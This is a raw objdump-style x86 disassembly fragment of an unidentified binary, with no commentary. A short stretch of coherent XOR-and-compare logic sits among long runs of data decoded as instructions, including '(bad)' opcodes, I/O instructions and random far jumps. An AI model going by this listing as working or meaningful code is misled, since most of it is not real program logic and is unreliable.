  41c82c:	xor    cl,BYTE PTR [ecx+0x5a]
  41c82f:	xor    eax,DWORD PTR [ecx]
  41c831:	retf   
  41c832:	fimul  DWORD PTR [edx]
  41c834:	test   eax,0x68a4e11f
  41c839:	jp     0x41c7e3
  41c83b:	rol    edi,0x9c
  41c83e:	iret   
  41c83f:	pop    eax
  41c840:	mov    edx,0x315f0b89
  41c845:	leave  
  41c846:	mov    al,0xfc
  41c848:	push   ss
  41c849:	xor    DWORD PTR [edx+0x788e8444],eax
  41c84f:	arpl   WORD PTR [edi],bx
  41c851:	cmp    al,0x6e
  41c853:	fld    TBYTE PTR [ebx+0x672a48ca]
  41c859:	mov    esp,0x7edff791
  41c85e:	or     DWORD PTR [esi+0x46],ebp
  41c861:	xor    eax,0xbaa14e3e
  41c866:	cdq    
  41c867:	retf   0x6acd
  41c86a:	lea    eax,[ebp-0x11]
  41c86d:	jb     0x41c8ce
  41c86f:	mov    cl,0xb8
  41c871:	jo     0x41c8c6
  41c873:	inc    ecx
  41c874:	leave  
  41c875:	gs mov ebx,0x268816c3
  41c87b:	or     eax,0x9f5b8fba
  41c880:	and    eax,DWORD PTR [edx-0x215b105]
  41c886:	or     eax,0x2474ffb2
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	sub    esp,eax
  41c93d:	out    0xaa,eax
  41c93f:	out    dx,eax
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0x81181812
  41c948:	stos   DWORD PTR es:[edi],eax
  41c949:	pop    ecx
  41c94a:	sub    edx,edi
  41c94c:	inc    ecx
  41c94d:	neg    BYTE PTR [edx+0x226940e6]
  41c953:	add    BYTE PTR [esi+0x1b],0x82
  41c957:	pop    es
  41c958:	inc    esi
  41c959:	jae    0x41c963
  41c95b:	and    ah,BYTE PTR [esi+0x6990497b]
  41c961:	adc    BYTE PTR ds:0x7684541e,al
  41c967:	jns    0x41c9cb
  41c969:	fs ins DWORD PTR es:[edi],dx
  41c96b:	and    ebp,DWORD PTR [ebx-0x2374cf2a]
  41c971:	push   edi
  41c972:	lahf   
  41c973:	out    0x85,eax
  41c975:	add    dx,WORD PTR ss:[ebp-0x742c4716]
  41c97d:	popf   
  41c97e:	popa   
  41c97f:	push   cs
  41c980:	push   esp
  41c981:	frstor [edi+edx*1-0x5a]
  41c985:	loopne 0x41c985
  41c987:	and    eax,0x82d5034c
  41c98c:	and    bl,bh
  41c98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c98f:	shl    esp,1
  41c991:	lods   al,BYTE PTR ds:[esi]
  41c992:	mov    al,0x73
  41c994:	push   ss
  41c995:	sbb    edi,DWORD PTR [ebx]
  41c997:	jp     0x41c982
  41c999:	xor    BYTE PTR [esi+0x17],ah
  41c99c:	loope  0x41c988
  41c99e:	dec    ebx
  41c99f:	popf   
  41c9a0:	dec    esi
  41c9a1:	xor    eax,edi
  41c9a3:	push   edi
  41c9a4:	pop    es
  41c9a5:	sub    eax,0x59f75401
  41c9aa:	daa    
  41c9ab:	jg     0x41ca12
  41c9ad:	daa    
  41c9ae:	sbb    al,0x14
  41c9b0:	imul   ebx,DWORD PTR [esi],0x1e
  41c9b3:	pop    ecx
  41c9b4:	scas   al,BYTE PTR es:[edi]
  41c9b5:	xor    BYTE PTR ds:0x1edaf5dc,dh
  41c9bc:	fadd   DWORD PTR [esp]
  41c9bf:	mov    esi,0xf5f24725
  41c9c4:	data16 adc BYTE PTR [edx-0xa],dl
  41c9c8:	imul   esi,DWORD PTR [edi+0x3c2dbb7f],0xf8122880
  41c9d2:	push   0x683bb6e1
  41c9d7:	mov    eax,ds:0xd37c129
  41c9dc:	and    cl,BYTE PTR [edi-0x428a47bc]
  41c9e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9e3:	std    
  41c9e4:	sub    bl,BYTE PTR [ecx]
  41c9e6:	mov    edx,0xf14f8bdc
  41c9eb:	icebp  
  41c9ec:	outs   dx,BYTE PTR ds:[esi]
  41c9ed:	dec    edx
  41c9ee:	cli    
  41c9ef:	cmp    al,0x37
  41c9f1:	pop    ebx
  41c9f2:	retf   0xc241
  41c9f5:	dec    edi
  41c9f6:	lods   al,BYTE PTR ds:[esi]
  41c9f7:	outs   dx,DWORD PTR ds:[esi]
  41c9f8:	sbb    eax,DWORD PTR [esi+0x75]
  41c9fb:	daa    
  41c9fc:	(bad)  
  41c9fd:	nop
  41c9fe:	ret    
  41c9ff:	adc    dh,BYTE PTR [ebx]
  41ca01:	rcl    DWORD PTR [esi+0x6f],cl
  41ca04:	out    dx,al
  41ca05:	(bad)  
  41ca06:	sbb    eax,0x7e26ad7
  41ca0b:	xchg   BYTE PTR [ecx+eax*4+0x547231b7],dh
  41ca12:	ss cmp al,0x17
  41ca15:	jle    0x41c9c7
  41ca17:	int3   
  41ca18:	cli    
  41ca19:	push   0x6cd7a45c
  41ca1e:	mov    dh,0x81
  41ca20:	loop   0x41c9cd
  41ca22:	push   es
  41ca23:	mov    ebx,0x32090ed8
  41ca28:	mov    BYTE PTR [ecx],dl
  41ca2a:	arpl   si,ax
  41ca2c:	mov    ah,0xab
  41ca2e:	stos   DWORD PTR es:[edi],eax
  41ca2f:	(bad)  
  41ca30:	outs   dx,BYTE PTR ds:[esi]
  41ca31:	push   ds
  41ca32:	sar    ch,1
  41ca34:	push   eax
  41ca35:	sub    bh,dh
  41ca37:	push   edx
  41ca38:	dec    ebp
  41ca39:	imul   esi,DWORD PTR [edx+ebx*4],0x4b
  41ca3d:	out    0xce,al
  41ca3f:	(bad)  [ecx+0x7e]
  41ca42:	aas    
  41ca43:	sbb    eax,0xd8adc285
  41ca48:	xor    al,0x4e
  41ca4a:	jmp    0x41ca84
  41ca4c:	push   esi
  41ca4d:	rol    DWORD PTR [edi+0x46],cl
  41ca50:	addr16 pop eax
  41ca52:	sub    eax,0xc2143a9e
  41ca57:	out    0xc5,eax
  41ca59:	inc    eax
  41ca5a:	enter  0x7b7f,0xf1
  41ca5e:	mov    al,ds:0xc339a4e5
  41ca63:	add    eax,0x3563472
  41ca68:	ins    BYTE PTR es:[edi],dx
  41ca69:	mov    ds:0x1ab2f2ae,eax
  41ca6e:	mov    bl,0xc1
  41ca70:	les    ecx,FWORD PTR [esi+0x72]
  41ca73:	daa    
  41ca74:	pop    ebp
  41ca75:	inc    edi
  41ca76:	push   ebx
  41ca77:	add    cl,ah
  41ca79:	bound  eax,QWORD PTR [edi-0x1c68e097]
  41ca7f:	adc    DWORD PTR [ebp-0x7],0x55
  41ca83:	pop    ebp
  41ca84:	stc    
  41ca85:	mov    bl,0xbb
  41ca87:	dec    edx
  41ca88:	lea    ecx,[eax+0x613db836]
  41ca8e:	pop    ecx
  41ca8f:	and    eax,0xb185090e
  41ca94:	sbb    BYTE PTR [edi-0x51248419],dh
  41ca9a:	stos   DWORD PTR es:[edi],eax
  41ca9b:	adc    esi,DWORD PTR [ecx]
  41ca9d:	clc    
  41ca9e:	mov    ch,0x35
  41caa0:	mov    ds:0x2fda567a,al
  41caa5:	push   esi
  41caa6:	jmp    DWORD PTR [eax]
  41caa8:	push   cs
  41caa9:	scas   eax,DWORD PTR es:[edi]
  41caaa:	cmp    al,0xe4
  41caac:	out    0xe3,eax
  41caae:	das    
  41caaf:	jecxz  0x41cb1d
  41cab1:	ret    0xe91b
  41cab4:	add    eax,0x87579952
  41cab9:	push   0x1baa3d86
  41cabe:	mov    dl,BYTE PTR [edx-0x79c40109]
  41cac4:	adc    al,0x76
  41cac6:	or     esp,DWORD PTR [esi+0x65]
  41cac9:	sbb    ebx,edx
  41cacb:	jno    0x41cad9
  41cacd:	xchg   esp,eax
  41cace:	cmc    
  41cacf:	std    
  41cad0:	fcomp  QWORD PTR [ecx-0x51]
  41cad3:	cmp    esi,DWORD PTR [eax]
  41cad5:	mov    ah,0xd9
  41cad7:	mov    ecx,esi
  41cad9:	cmp    eax,ebx
  41cadb:	arpl   WORD PTR [ebp+0x37d61170],sp
  41cae1:	dec    ecx
  41cae2:	cdq    
  41cae3:	aas    
  41cae4:	sar    al,0x55
  41cae7:	add    dh,ah
  41cae9:	add    al,0xba
  41caeb:	loope  0x41cb2f
  41caed:	sbb    al,0xae
  41caef:	cmp    bl,BYTE PTR [ebx]
  41caf1:	aas    
  41caf2:	fcomp  QWORD PTR [edi]
  41caf4:	popf   
  41caf5:	jnp    0x41cb1f
  41caf7:	imul   BYTE PTR [ebx-0x5a]
  41cafa:	xchg   BYTE PTR [edx-0x39a391c5],al
  41cb00:	retf   
  41cb01:	cs call 0x5e53e0b1
  41cb07:	mov    eax,ds:0x8fc838a9
  41cb0c:	jno    0x41cabe
  41cb0e:	(bad)  
  41cb0f:	js     0x41cb3c
  41cb11:	and    BYTE PTR [edi-0x59c3ad30],ah
  41cb17:	jns    0x41cb90
  41cb19:	adc    ah,ah
  41cb1b:	push   eax
  41cb1c:	jle    0x41cb3f
  41cb1e:	xor    edi,DWORD PTR [ebx]
  41cb20:	into   
  41cb21:	xor    DWORD PTR [edx],ebp
  41cb23:	adc    eax,0x844787cc
  41cb28:	adc    esp,0xffffffa2
  41cb2b:	bound  edi,QWORD PTR [esi]
  41cb2d:	or     BYTE PTR [eax],cl
  41cb2f:	push   0xecc77461
  41cb34:	loope  0x41cad1
  41cb36:	pop    ebx
  41cb37:	or     eax,0x803e3452
  41cb3c:	fstp   QWORD PTR [edx]
  41cb3e:	cs adc ebp,ecx
  41cb41:	push   cs
  41cb42:	mov    BYTE PTR [esi+0x7da94af8],ah
  41cb48:	push   cs
  41cb49:	(bad)
  41cb4c:	clc    
  41cb4d:	jbe    0x41cb12
  41cb4f:	xor    eax,0x778e67f9
  41cb54:	xchg   edx,eax
  41cb56:	ds (bad) 
  41cb58:	and    al,0xf2
  41cb5a:	fs push ebx
  41cb5c:	fiadd  DWORD PTR [eax+0x72]
  41cb5f:	inc    ecx
  41cb60:	bound  ebx,QWORD PTR [esi+0x36422aef]
  41cb66:	dec    ecx
  41cb67:	stc    
  41cb68:	div    BYTE PTR [esi]
  41cb6a:	lods   al,BYTE PTR ds:[esi]
  41cb6b:	inc    edi
  41cb6c:	cdq    
  41cb6d:	sbb    al,0xa7
  41cb6f:	mov    DWORD PTR [ebp-0x6],ecx
  41cb72:	cdq    
  41cb73:	outs   dx,DWORD PTR ds:[esi]
  41cb74:	out    dx,eax
  41cb75:	aaa    
  41cb76:	mov    esi,0x8a5e4fec
  41cb7b:	inc    eax
  41cb7c:	inc    ebx
  41cb7d:	les    ebp,FWORD PTR [edx-0x64]
  41cb80:	xchg   edx,eax
  41cb81:	push   0x76
  41cb83:	sub    DWORD PTR [edx-0xe],0xe767c7dd
  41cb8a:	jmp    0x541a5e38
  41cb8f:	mov    esi,edi
  41cb91:	add    eax,DWORD PTR [ebx+eax*2+0x47a2b35]
  41cb98:	out    dx,al
  41cb99:	jb     0x41cc01
  41cb9b:	add    DWORD PTR [esi-0x1d],0x5df1fb35
  41cba2:	xchg   ebx,eax
  41cba3:	ja     0x41cbb8
  41cba5:	xchg   ebp,eax
  41cba6:	sar    DWORD PTR [ebp+edi*4-0x2],0x3c
  41cbab:	loop   0x41cbe0
  41cbad:	cmp    dh,0xb8
  41cbb0:	push   es
  41cbb1:	sbb    al,0x3f
  41cbb3:	mov    WORD PTR [ebp+0x3a],gs
  41cbb6:	cmp    esp,esp
  41cbb8:	add    bh,BYTE PTR ds:0x10e2c6dd
  41cbbe:	jns    0x41cb83
  41cbc0:	cmp    DWORD PTR [esi-0x4921f4df],eax
  41cbc6:	shl    DWORD PTR [edx-0x24],0x3
  41cbca:	test   BYTE PTR [esi],cl
  41cbcc:	mov    BYTE PTR [eax+edi*1+0xf563973],0xdf
  41cbd4:	(bad)  
  41cbd5:	cmc    
  41cbd6:	aam    0xd8
  41cbd8:	pop    ds
  41cbd9:	mov    ah,0x33
  41cbdb:	or     ah,0xd5
  41cbde:	aam    0xed
  41cbe0:	or     ch,dh
  41cbe2:	ds arpl bx,si
  41cbe5:	aaa    
  41cbe6:	mov    bl,0x4
  41cbe8:	dec    ecx
  41cbe9:	popa   
  41cbea:	add    dl,BYTE PTR [esi-0x23]
  41cbed:	push   ss
  41cbee:	mov    ds,WORD PTR [ecx-0x57871caf]
  41cbf4:	or     eax,0xaf6747f6
  41cbf9:	jmp    0xdaa5:0xf3cb2a25
  41cc00:	pusha  
  41cc01:	inc    edi
  41cc02:	adc    esi,ecx
  41cc04:	mov    edi,0xe06ecc27
  41cc09:	ret    
  41cc0a:	xchg   esp,eax
  41cc0b:	cmp    BYTE PTR [esi-0x78],dh
  41cc0e:	push   ds
  41cc0f:	mov    cl,0x70
  41cc11:	bound  ecx,QWORD PTR [edx+0x27633b1e]
  41cc17:	push   ebx
  41cc18:	loopne 0x41cc5c
  41cc1a:	mov    edi,0x7179c943
  41cc1f:	(bad)  
  41cc20:	adc    eax,0xa11b3eeb
  41cc25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc26:	fnsave [eax-0x1b706d2e]
  41cc2c:	jo     0x41cc3c
  41cc2e:	sbb    esp,DWORD PTR [ebx-0xd]
  41cc31:	in     eax,dx
  41cc32:	mov    ebx,0xf4198526
  41cc37:	and    BYTE PTR [edi+0x66],dh
  41cc3a:	jae    0x41cc79
  41cc3c:	call   0x2212ffd8
  41cc41:	enter  0x1e70,0x91
  41cc45:	xor    al,0x6f
  41cc47:	cmp    DWORD PTR [ecx+0x51],ecx
  41cc4a:	jmp    0x41cbd4
  41cc4c:	jl     0x41cc25
  41cc4e:	enter  0x1378,0xad
  41cc52:	mov    edi,0x3efc15da
  41cc57:	test   DWORD PTR [esi-0x2eab1c45],0x7b3be873
  41cc61:	mov    BYTE PTR [edx-0x120679b0],ah
  41cc67:	sub    dh,bl
  41cc69:	scas   al,BYTE PTR es:[edi]
  41cc6a:	or     bl,BYTE PTR [edx+0x50717809]
  41cc70:	sbb    al,BYTE PTR [edx+0x275a4ba4]
  41cc76:	popf   
  41cc77:	mov    ds:0x715b7f9f,eax
  41cc7c:	mov    BYTE PTR [ebx-0x37],bl
  41cc7f:	int3   
  41cc80:	push   0xffffffca
  41cc82:	imul   ebx,DWORD PTR [edx+0x614e8f26],0xffffffc1
  41cc89:	push   ss
  41cc8a:	retf   
  41cc8b:	retf   0x2ff3
  41cc8e:	xlat   BYTE PTR ds:[ebx]
  41cc8f:	sar    DWORD PTR [esi],cl
  41cc91:	fimul  DWORD PTR [edi-0x69]
  41cc94:	add    al,0xf4
  41cc96:	inc    eax
  41cc97:	scas   al,BYTE PTR es:[edi]
  41cc98:	jnp    0x41cce1
  41cc9a:	mov    eax,ds:0xa25c7014
  41cc9f:	jl     0x41cc5e
  41cca1:	dec    esi
  41cca2:	cmovae ebp,edi
  41cca5:	cmp    bl,cl
  41cca7:	out    0xd8,al
  41cca9:	mov    eax,ds:0x9e12e896
  41ccae:	cmp    ebx,eax
  41ccb0:	lea    esi,[edi+ebp*1+0x7bd46616]
  41ccb7:	(bad)  
  41ccb8:	les    esp,FWORD PTR [edx-0xe]
  41ccbb:	inc    ecx
  41ccbc:	inc    eax
  41ccbd:	mov    al,0xf8
  41ccbf:	test   eax,0x4eaab236
  41ccc4:	out    0xf7,eax
  41ccc6:	mov    ds,WORD PTR [edx-0x7b]
  41ccc9:	sbb    BYTE PTR [edi],ah
  41cccb:	lock data16 jo 0x41cd45
  41cccf:	sub    BYTE PTR [edx],dh
  41ccd1:	jb     0x41cd0d
  41ccd3:	psubq  mm4,QWORD PTR [esi]
  41ccd6:	ret    
  41ccd7:	retf   
  41ccd8:	mov    dh,ch
  41ccda:	lock lods al,BYTE PTR ds:[esi]
  41ccdc:	aam    0xc
  41ccde:	inc    eax
  41ccdf:	cmp    eax,0xc9942eef
  41cce4:	repz lock mov eax,es
  41cce8:	cmp    DWORD PTR [ebx],esp
  41ccea:	jne    0x41cc7a
  41ccec:	sahf   
  41cced:	jg     0x41cc79
  41ccef:	mov    edi,0x69b311aa
  41ccf4:	mov    ah,0xc9
  41ccf6:	outs   dx,BYTE PTR ds:[esi]
  41ccf7:	icebp  
  41ccf8:	pushf  
  41ccf9:	mov    cl,BYTE PTR [esp+0x3c]
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0x7e4f87a8
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1-0x5780e7e8],bh
  41cd1e:	repz idiv DWORD PTR [eax+0x45212d0f]
  41cd25:	call   0x6a0e:0x143f19fb
  41cd2c:	iret   
  41cd2d:	or     BYTE PTR [eax-0x6f515f1b],ah
  41cd33:	and    DWORD PTR [esi+0x59],eax
  41cd36:	in     al,dx
  41cd37:	cmc    
  41cd38:	icebp  
  41cd39:	repz mov al,0x9d
  41cd3c:	xor    eax,0x59d434d3
  41cd41:	sub    dl,BYTE PTR [ecx+0x3]
  41cd44:	xor    ch,bh
  41cd46:	inc    eax
  41cd47:	xchg   BYTE PTR [ecx+0x6d92ebb4],cl
  41cd4d:	xchg   esi,eax
  41cd4e:	mov    ebx,0x949dedd3
  41cd53:	call   FWORD PTR [ebx+0x14]
  41cd56:	sub    eax,0x96b55aa4
  41cd5b:	iret   
  41cd5c:	inc    eax
  41cd5d:	add    eax,DWORD PTR [esi+eax*8-0xa19dc77]
  41cd64:	repnz int3 
  41cd66:	xchg   esi,eax
  41cd67:	push   ebp
  41cd68:	xor    DWORD PTR [eax+0x7de1c67f],edi
  41cd6e:	in     eax,0x69
  41cd70:	lahf   
  41cd71:	std    
  41cd72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd73:	xchg   DWORD PTR [edi-0x70050975],eax
  41cd79:	xchg   ecx,eax
  41cd7a:	and    eax,0x604a766c
  41cd7f:	jns    0x41cd76
  41cd81:	mov    ?,WORD PTR [esi]
  41cd83:	push   esp
  41cd84:	sub    DWORD PTR [ebp+0x66],0xb02fe3c5
  41cd8b:	in     al,0xc7
  41cd8d:	(bad)  
  41cd8e:	lods   eax,DWORD PTR ds:[esi]
  41cd8f:	fistp  QWORD PTR [ecx-0x56]
  41cd92:	pushf  
  41cd93:	mov    DWORD PTR [ecx+0x28],edi
  41cd96:	cmp    eax,0xc0422b9a
  41cd9b:	ins    DWORD PTR es:[edi],dx
  41cd9c:	dec    esi
  41cd9d:	push   ds
  41cd9e:	pop    ecx
  41cd9f:	sub    ebp,DWORD PTR [edi]
  41cda1:	push   es
  41cda2:	fs ins BYTE PTR es:[edi],dx
  41cda4:	jnp    0x41ce12
  41cda6:	mov    ds:0x1ac3861b,eax
  41cdab:	rol    BYTE PTR [ebx+0x7c],1
  41cdae:	(bad)  
  41cdaf:	pop    esi
  41cdb0:	xchg   esi,eax
  41cdb1:	mov    ds:0x2f6a2422,al
  41cdb6:	mov    ebp,esp
  41cdb8:	pop    ebp
  41cdb9:	loope  0x41ce1b
  41cdbb:	ret    0x77bd
  41cdbe:	and    ecx,DWORD PTR [ebx+0x27b8324d]
  41cdc4:	div    BYTE PTR [eax-0x7e350fd1]
  41cdca:	jnp    0x41ce2e
  41cdcc:	push   ecx
  41cdcd:	xchg   ecx,eax
  41cdce:	xchg   esi,eax
  41cdcf:	repz (bad) 
  41cdd1:	ins    DWORD PTR es:[edi],dx
  41cdd2:	test   eax,0x8ba01ca
  41cdd7:	cwde   
  41cdd8:	and    DWORD PTR [eax+0x39ab207e],ebx
  41cdde:	mov    edi,0x7ba74a5c
  41cde3:	mov    esp,0x39217b88
  41cde8:	fbld   TBYTE PTR [ebx*8+0x2fd5ca16]
  41cdef:	jmp    0x15f4:0x2448ecbb
  41cdf6:	push   ds
  41cdf7:	clc    
  41cdf8:	xor    bh,dh
  41cdfa:	push   es
  41cdfb:	mov    dh,0x37
  41cdfd:	cli    
  41cdfe:	mov    ebx,0xb9e26860
  41ce03:	ret    
  41ce04:	fistp  QWORD PTR [ecx-0x301283b5]
  41ce0a:	pushf  
  41ce0b:	iret   
  41ce0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce0d:	ss or  esp,esp
  41ce10:	push   ebx
  41ce11:	sub    BYTE PTR [edx+eiz*1-0x52],cl
  41ce15:	pop    edi
  41ce16:	in     eax,dx
  41ce17:	push   esp
  41ce18:	mov    ebx,0x10e84ab
  41ce1d:	xor    DWORD PTR [ebp*4+0x2766e59e],ecx
  41ce24:	daa    
  41ce25:	pop    ds
  41ce26:	mov    cl,0xa5
  41ce28:	inc    esi
  41ce29:	int    0xa8
  41ce2b:	or     eax,0xfe9c67c6
  41ce30:	cli    
  41ce31:	add    eax,0xa999ef0a
  41ce36:	(bad)  
  41ce37:	ins    BYTE PTR es:[edi],dx
  41ce38:	or     DWORD PTR [esi+0x6a21ebd9],esi
  41ce3e:	mov    WORD PTR [ebx+0x6b],?
  41ce41:	mov    BYTE PTR [ebx],dl
  41ce43:	into   
  41ce44:	push   0x34
  41ce46:	test   eax,0xc171177c
  41ce4b:	aad    0xbf
  41ce4d:	or     BYTE PTR [edx+0x24],ch
  41ce50:	jp     0x41cea8
  41ce52:	(bad)  
  41ce53:	ins    DWORD PTR es:[edi],dx
  41ce54:	outs   dx,BYTE PTR ds:[esi]
  41ce55:	pop    edi
  41ce56:	jae    0x41ce86
  41ce58:	mov    DWORD PTR [ecx-0x64],0xf0b81ed2
  41ce5f:	mov    ebp,0x4890f616
  41ce64:	mov    esp,DWORD PTR [ebx+edi*1-0x2aedb5f1]
  41ce6b:	std    
  41ce6c:	fist   WORD PTR [edi]
  41ce6e:	xlat   BYTE PTR ds:[ebx]
  41ce6f:	add    DWORD PTR [esi+0x5a],ecx
  41ce72:	aam    0x71
  41ce74:	sbb    dl,BYTE PTR [ebx+0x33709595]
  41ce7a:	data16 and BYTE PTR [edi-0x7b2b1ed5],0x7f
  41ce82:	push   ecx
  41ce83:	push   eax
  41ce84:	xor    eax,0xa1ddfd68
  41ce89:	pop    esp
  41ce8a:	pop    ds
  41ce8b:	jb     0x41ceed
  41ce8d:	pop    esp
  41ce8e:	xor    bh,bl
  41ce90:	push   ss
  41ce91:	mov    ebx,0x3a5f2e76
  41ce96:	in     al,dx
  41ce97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce98:	fcom   st(0)
  41ce9a:	jo     0x41cf0d
  41ce9c:	cwde   
  41ce9d:	pop    ss
  41ce9e:	aad    0xd2
  41cea0:	shl    ecx,1
  41cea2:	jecxz  0x41ce96
  41cea4:	out    0x63,eax
  41cea6:	div    BYTE PTR [ecx]
  41cea8:	shr    BYTE PTR [ecx],0xde
  41ceab:	dec    edi
  41ceac:	push   cs
  41cead:	inc    esi
  41ceae:	adc    eax,0x85ddf9cd
  41ceb3:	pop    esp
  41ceb4:	pushf  
  41ceb5:	pop    ds
  41ceb6:	in     al,0x11
  41ceb8:	dec    ebp
  41ceb9:	out    dx,eax
  41ceba:	fiadd  DWORD PTR [esi+0x71]
  41cebd:	or     BYTE PTR [ecx+0x31],ah
  41cec0:	hlt    
  41cec1:	xor    dl,BYTE PTR [esi-0x16079b]
  41cec7:	loopne 0x41cea2
  41cec9:	cmp    eax,0xce2835a6
  41cece:	leave  
  41cecf:	outs   dx,DWORD PTR ds:[esi]
  41ced0:	cmp    ebp,DWORD PTR [ebp+0xe9ba811]
  41ced6:	cwde   
  41ced7:	in     al,0xea
  41ced9:	and    ah,bl
  41cedb:	leave  
  41cedc:	xchg   DWORD PTR ss:[edx-0x4a],esi
  41cee0:	repz daa 
  41cee2:	shl    DWORD PTR [esi],cl
  41cee4:	add    ah,BYTE PTR [esi+0x7c]
  41cee7:	or     al,0x3e
  41cee9:	in     al,dx
  41ceea:	test   BYTE PTR [ebp+0x613dd819],ch
  41cef0:	ds add eax,0x31a38358
  41cef6:	aad    0xff
  41cef8:	mov    cl,0xad
  41cefa:	xchg   edx,eax
  41cefb:	cmp    eax,0x95b9d019
  41cf00:	jmp    0x4bb6:0xa460dac2
  41cf07:	xor    edx,DWORD PTR [esp+ebx*2+0x38]
  41cf0b:	into   
  41cf0c:	fwait
  41cf0d:	push   edi
  41cf0e:	jnp    0x41cf34
  41cf10:	pop    ebp
  41cf11:	sub    ch,dh
  41cf13:	imul   ebp,DWORD PTR ds:0xb536af26,0x957deac8
  41cf1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf1e:	pop    es
  41cf1f:	adc    ch,BYTE PTR [eax]
  41cf21:	inc    ebx
  41cf22:	iret   
  41cf23:	data16 aad 0x44
  41cf26:	(bad)  
  41cf29:	out    0x3c,al
  41cf2b:	or     DWORD PTR [edx+ebx*4],ebp
  41cf2e:	mov    ebx,0x31e22ce5
  41cf33:	mov    dh,0x17
  41cf35:	retf   0xfaa4
  41cf38:	cmp    dh,BYTE PTR [esi+0x247f07f9]
  41cf3e:	inc    edx
  41cf3f:	ret    0x2bc4
  41cf42:	test   eax,0x36783968
  41cf47:	fsubr  QWORD PTR [ebp+0x68]
  41cf4a:	and    eax,0x6dc30b2b
  41cf4f:	jge    0x41ceec
  41cf51:	and    BYTE PTR [eax+0x21a1f0c0],ch
  41cf57:	test   al,0xdc
  41cf59:	ins    DWORD PTR es:[edi],dx
  41cf5a:	pop    esi
  41cf5b:	xchg   edi,eax
  41cf5c:	inc    ebp
  41cf5d:	inc    edx
  41cf5e:	mov    cl,0xd8
  41cf60:	ret    
  41cf61:	ds shr dh,1
  41cf64:	out    0x1b,al
  41cf66:	or     BYTE PTR [edx-0x49b4af9f],dl
  41cf6c:	and    al,0xc2
  41cf6e:	push   cs
  41cf6f:	mov    ecx,esi
  41cf71:	call   0x3953:0xf2bff3e2
  41cf78:	add    al,0xa
  41cf7a:	aas    
  41cf7b:	mov    eax,ds:0x4a29d5b3
  41cf80:	inc    DWORD PTR [edi-0x488cb825]
  41cf86:	stc    
  41cf87:	xchg   ebp,eax
  41cf88:	fst    st(2)
  41cf8a:	ins    BYTE PTR es:[edi],dx
  41cf8b:	mov    esi,0xee809b57
  41cf90:	mov    ebx,0xa6549b36
  41cf95:	popa   
  41cf96:	ja     0x41cf66
  41cf98:	xchg   ebp,eax
  41cf99:	xor    al,0x31
  41cf9b:	add    DWORD PTR [ecx-0x31],ebx
  41cf9e:	xor    eax,0x4c47f385
  41cfa3:	xchg   DWORD PTR [esi-0x76],ebp
  41cfa6:	hlt    
  41cfa7:	and    DWORD PTR [ecx-0x2c3770f3],esp
  41cfad:	pop    ecx
  41cfae:	ja     0x41d02c
  41cfb0:	fist   WORD PTR [edx+0x52]
  41cfb3:	sbb    BYTE PTR [edx],ah
  41cfb5:	or     al,0x64
  41cfb7:	ss push ds
  41cfb9:	xchg   esp,eax
  41cfba:	sub    esi,DWORD PTR [edi-0x7a]
  41cfbd:	aad    0x7c
  41cfbf:	retf   0xe4c4
  41cfc2:	dec    edi
  41cfc3:	fadd   QWORD PTR [eax+0x1f]
  41cfc6:	ja     0x41cf4d
  41cfc8:	iret   
  41cfc9:	cmp    al,0x52
  41cfcb:	sub    bl,bl
  41cfcd:	jnp    0x41d01f
